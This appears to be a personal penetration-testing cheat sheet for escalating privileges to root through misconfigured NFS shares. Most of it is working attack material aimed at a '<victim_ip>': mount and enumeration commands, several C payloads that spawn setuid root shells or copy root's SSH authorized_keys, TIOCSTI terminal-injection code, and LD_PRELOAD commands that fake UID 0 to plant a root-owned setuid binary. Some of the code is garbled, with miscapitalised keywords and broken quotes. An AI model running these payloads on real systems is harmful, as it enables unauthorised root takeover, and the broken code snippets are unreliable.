I can mount myself to read the current content
Showmount –e <victim_ip>
                     Or
Showmount –a <victim_ip>

Mount –t nfs <victim_ip>:<mounting_point>   simon_directory


If after mounting the directories/files can be accessed only by a user with a specific UID e.g 1000 then just create a user with that UID , switch into that user and now I can access the directories

Useradd simon1 –uid 1000


After mounting I can upload a malicious file with the following content

Int main(void)
{
Setresuid(0,0,0);
System(“whoami”);

}

 Compile And  put a sticky bit on it, 
Gcc malicious.c -o malware
Chmod 4755 malware


then after obtaining the initial access to the target e.g as www-data (as the reuslt of RCE) I can launch the file with the elevated privileges

If this did not work – upload a malicious file with this content

#include <unistd.h>
#include <sys/ioctl.h>
int main()
{    
char *cmd = "id\n";
    while(*cmd)
     ioctl(0, TIOCSTI, cmd++);
    execlp("/bin/id", "id", NULL);
}

Another example 

#include <unistd.h>
#include <sys/ioctl.h>
int main()
{    
char *cmd = "id\n";
while(*cmd)
     ioctl(0, TIOCSTI, cmd++);
 Execlp("/bin/cp", "cp",”/root/.ssh/authorized_keys”,”/home/user/.ssh/authorized_keys" ”NULL);
}

Compile and put a sticky bit on it 
then after obtaining the initial access to the target e.g as www-data (as the reuslt of RCE) I can launch the file with the elevated privileges

or

//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}


or

// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}

or 

cp /bin/bash .
chmod +s bash

then after obtaining the initial access to the target e.g as www-data (as the reuslt of RCE) I can launch the file with the elevated privileges
./bash -p

If neither of those payloads worked let’s enhance them with faked UID in the RPC calls

compile the payload but insteead of putting sticky bit we will fake UID in the RPC call
put it in the share
execute the following lines:
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../malware nfs://<victim_ip>/<sharename>/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://<victim_ip>/<sharename>/malware
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://<victim_ip>/<sharename>/malware
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://<victim_ip>/<sharename>/malware

then execute the malware from the victim terminal
/mnt/share/malware 

and you should escalate your privileges to root
